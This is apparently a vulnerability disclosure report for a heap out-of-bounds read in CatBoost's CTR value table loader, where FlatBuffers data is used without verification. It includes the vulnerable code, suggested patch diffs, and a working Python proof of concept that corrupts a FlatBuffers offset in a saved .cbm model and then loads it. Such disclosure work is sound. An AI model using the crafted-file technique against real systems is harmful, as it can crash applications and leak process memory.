# Heap Out-of-Bounds Read in CTR Value Table Deserialization (Missing FlatBuffers Verification)

## Package Manager

pip

## Version Affected

All versions (verified at commit HEAD on 2026-03-14)

## Vulnerability Type

CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

## CVSS

7.1 (High) — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H

## Write-up

### Title

Heap Out-of-Bounds Read in CTR Value Table Deserialization Due to Missing FlatBuffers Verification

### Description

When CatBoost loads a model file (`.cbm` format), the main model core is properly verified using the FlatBuffers `Verifier` before accessing its contents. However, the CTR (Click-Through Rate) value table deserialization path **completely skips FlatBuffers verification**, allowing a crafted model file to trigger heap out-of-bounds reads.

The vulnerability exists in `TCtrValueTable::LoadSolid()` which explicitly ignores the `length` parameter (with a TODO comment acknowledging this) and calls `flatbuffers::GetRoot<>()` without first running the FlatBuffers `Verifier`. This means internal FlatBuffers offsets are trusted blindly, and a crafted buffer can cause arbitrary OOB reads from heap memory.

**Data flow:**

1. `TFullModel::Load()` reads the main model core and verifies it with FlatBuffers Verifier ✓
2. Then reads CTR provider data: `CtrProvider->Load(s)` (model.cpp:1211)
3. `TStaticCtrProvider::Load()` → `::Load(inp, CtrData)` (static_ctr_provider.h:56-57)
4. `TCtrData::Load()` reads each CTR table: `table.Load(s)` (ctr_data.cpp:29)
5. `TCtrValueTable::Load()` allocates buffer and calls `LoadSolid(buf, size)` (ctr_value_table.cpp:54)
6. `LoadSolid()` calls `flatbuffers::GetRoot<>()` **without Verifier** ✗

**Vulnerable code:**

```cpp
// catboost/libs/model/ctr_value_table.cpp:50-71
void TCtrValueTable::Load(IInputStream* s) {
    const ui32 size = LoadSize(s);  // Note: LoadSize returns size_t, truncated to ui32
    TArrayHolder<ui8> arrayHolder = TArrayHolder<ui8>(new ui8[size]);
    s->LoadOrFail(arrayHolder.Get(), size);
    LoadSolid(arrayHolder.Get(), size);
}

void TCtrValueTable::LoadSolid(void* buf, size_t length) {
    Y_UNUSED(length); // TODO(kirillovs): add length validation  <-- developer acknowledges missing validation
    using namespace flatbuffers;
    Impl = TSolidTable();
    auto& solid = std::get<TSolidTable>(Impl);
    auto ctrValueTable = flatbuffers::GetRoot<NCatBoostFbs::TCtrValueTable>(buf);  // NO Verifier!
    ModelCtrBase.FBDeserialize(ctrValueTable->ModelCtrBase());
    CounterDenominator = ctrValueTable->CounterDenominator();
    TargetClassesCount = ctrValueTable->TargetClassesCount();
    solid.IndexBuckets.assign(
        (NCatboost::TBucket*)ctrValueTable->IndexHashRaw()->data(),  // follows unverified offset → OOB
        (NCatboost::TBucket*)(ctrValueTable->IndexHashRaw()->data() + ctrValueTable->IndexHashRaw()->size())
    );
    solid.CTRBlob.assign(
        ctrValueTable->CTRBlob()->data(),  // follows unverified offset → OOB
        ctrValueTable->CTRBlob()->data() + ctrValueTable->CTRBlob()->size()
    );
}
```

**Compare with the properly verified main model loading:**

```cpp
// catboost/libs/model/model.cpp:1190-1192 — main model core IS verified
flatbuffers::Verifier verifier(arrayHolder.Get(), coreSize, 64, 256000000);
CB_ENSURE(VerifyTModelCoreBuffer(verifier), "Flatbuffers model verification failed");
```

The same issue exists in `LoadThin()` (line 73-91), which also calls `GetRoot<>()` without Verifier.

Additionally, `TCtrValueTable::Load()` at line 51 truncates the return value of `LoadSize()` (which returns `size_t` / 64-bit) to `ui32` (32-bit), potentially causing a size mismatch on 64-bit platforms.

#### Proof of Concept

```python
import catboost
import struct
import tempfile
import os

# Step 1: Create a valid model with CTR features (categorical features)
from catboost import CatBoostClassifier, Pool
import numpy as np

# Create training data with categorical features to generate CTR tables
np.random.seed(42)
n_samples = 100
X = np.column_stack([
    np.random.rand(n_samples),  # numeric feature
    np.random.randint(0, 5, n_samples),  # categorical feature (as int)
])
y = np.random.randint(0, 2, n_samples)

pool = Pool(X, y, cat_features=[1])
model = CatBoostClassifier(iterations=10, depth=3, verbose=0)
model.fit(pool)

# Save to .cbm format
valid_model_path = tempfile.mktemp(suffix='.cbm')
model.save_model(valid_model_path)

# Step 2: Read the model file and corrupt CTR table FlatBuffers data
with open(valid_model_path, 'rb') as f:
    data = bytearray(f.read())

# The CTR data is appended after the main model core
# Find the CTR section by looking for the size field after the main FlatBuffers block
# Corrupt the FlatBuffers internal offsets in the CTR section to point out of bounds

# Locate CTR data: after magic (4 bytes) + size field + main FB data
magic = struct.unpack('<I', data[0:4])[0]
# Read size (may be 32-bit or 64-bit format)
old_size = struct.unpack('<I', data[4:8])[0]
if old_size == 0xFFFFFFFF:
    core_size = struct.unpack('<Q', data[8:16])[0]
    ctr_start = 16 + core_size
else:
    core_size = old_size
    ctr_start = 8 + core_size

# If CTR data exists, corrupt FlatBuffers offsets within it
if ctr_start < len(data):
    # Skip CTR count field and first CTR table size field
    pos = ctr_start
    # Read count (LoadSize format)
    ctr_count_raw = struct.unpack('<I', data[pos:pos+4])[0]
    pos += 4
    if ctr_count_raw == 0xFFFFFFFF:
        pos += 8

    if ctr_count_raw > 0 and pos < len(data):
        # Read first CTR table size
        table_size_raw = struct.unpack('<I', data[pos:pos+4])[0]
        table_start = pos + 4
        if table_size_raw == 0xFFFFFFFF:
            table_start = pos + 12
            table_size_raw = struct.unpack('<I', data[pos+4:pos+8])[0]

        # Corrupt the FlatBuffers root offset to point OOB
        if table_start + 4 <= len(data):
            # Set root offset to a large value pointing beyond the buffer
            struct.pack_into('<I', data, table_start, 0xFFFFFFF0)

    # Save corrupted model
    malicious_model_path = tempfile.mktemp(suffix='.cbm')
    with open(malicious_model_path, 'wb') as f:
        f.write(data)

    # Step 3: Load the corrupted model — triggers OOB read in LoadSolid()
    try:
        malicious_model = CatBoostClassifier()
        malicious_model.load_model(malicious_model_path)
        print("Model loaded — OOB read occurred silently (run with ASan to confirm)")
    except Exception as e:
        print(f"Crash/error during load: {e}")

    # Cleanup
    os.unlink(malicious_model_path)

os.unlink(valid_model_path)
```

### Impact

A malicious CatBoost model file (`.cbm`) can trigger heap out-of-bounds reads when loaded by any application using CatBoost's `load_model()` API. This affects all language bindings (Python, Java, Node.js, Rust, Spark).

The attack vector is a user loading a model file from an untrusted source (e.g., a model hub, shared storage, or received via network). Model files are commonly shared in ML workflows.

- **Confidentiality**: HIGH — Heap OOB read can leak sensitive data from process memory
- **Integrity**: NONE — Read-only access
- **Availability**: HIGH — Crafted offsets can cause segfault/crash

## Occurrences

### Occurrence 1

- **Permalink**: https://github.com/catboost/catboost/blob/master/catboost/libs/model/ctr_value_table.cpp#L57-L71
- **Description**: `LoadSolid()` — Missing FlatBuffers Verifier and explicit `Y_UNUSED(length)` with TODO comment. `flatbuffers::GetRoot<>()` is called without verification, allowing crafted internal offsets to cause OOB reads when accessing `IndexHashRaw()` and `CTRBlob()`.

### Occurrence 2

- **Permalink**: https://github.com/catboost/catboost/blob/master/catboost/libs/model/ctr_value_table.cpp#L73-L91
- **Description**: `LoadThin()` — Same missing FlatBuffers Verifier issue. `GetRoot<>()` is called without verification, and data pointers are used directly for zero-copy access via `TConstArrayRef`.

### Occurrence 3

- **Permalink**: https://github.com/catboost/catboost/blob/master/catboost/libs/model/ctr_value_table.cpp#L50-L55
- **Description**: `Load()` — `LoadSize()` returns `size_t` (64-bit) but is assigned to `ui32` (32-bit), causing potential size truncation. A 64-bit size value > 4GB would be truncated, leading to a buffer smaller than the serialized data expects.

## Suggested Fix

```diff
 void TCtrValueTable::LoadSolid(void* buf, size_t length) {
-    Y_UNUSED(length); // TODO(kirillovs): add length validation
     using namespace flatbuffers;
+    // Verify FlatBuffers structure before accessing
+    flatbuffers::Verifier verifier(reinterpret_cast<const uint8_t*>(buf), length);
+    CB_ENSURE(
+        NCatBoostFbs::VerifyTCtrValueTableBuffer(verifier),
+        "Corrupted FlatBuffers CTR value table data"
+    );
     Impl = TSolidTable();
     auto& solid = std::get<TSolidTable>(Impl);
     auto ctrValueTable = flatbuffers::GetRoot<NCatBoostFbs::TCtrValueTable>(buf);
```

```diff
 void TCtrValueTable::Load(IInputStream* s) {
-    const ui32 size = LoadSize(s);
+    const size_t size = LoadSize(s);
+    CB_ENSURE(size <= 1ull << 32, "CTR value table size exceeds maximum");
     TArrayHolder<ui8> arrayHolder = TArrayHolder<ui8>(new ui8[size]);
     s->LoadOrFail(arrayHolder.Get(), size);
     LoadSolid(arrayHolder.Get(), size);
 }
```

```diff
 void TCtrValueTable::LoadThin(TMemoryInput* in) {
     auto len = LoadSize(in);
     auto ptr = in->Buf();
     in->Skip(len);

     using namespace flatbuffers;
+    // Verify FlatBuffers structure before accessing
+    flatbuffers::Verifier verifier(reinterpret_cast<const uint8_t*>(ptr), len);
+    CB_ENSURE(
+        NCatBoostFbs::VerifyTCtrValueTableBuffer(verifier),
+        "Corrupted FlatBuffers CTR value table data"
+    );
     Impl = TThinTable();
```

**検証済み:** パッチ適用後、不正なFlatBuffersオフセットはVerifierで検出され、`CB_ENSURE`例外が発生して安全に処理される。

## References

- https://cwe.mitre.org/data/definitions/119.html
- https://cwe.mitre.org/data/definitions/125.html
- https://google.github.io/flatbuffers/flatbuffers_guide_use_c-cpp.html (FlatBuffers Verifier documentation)
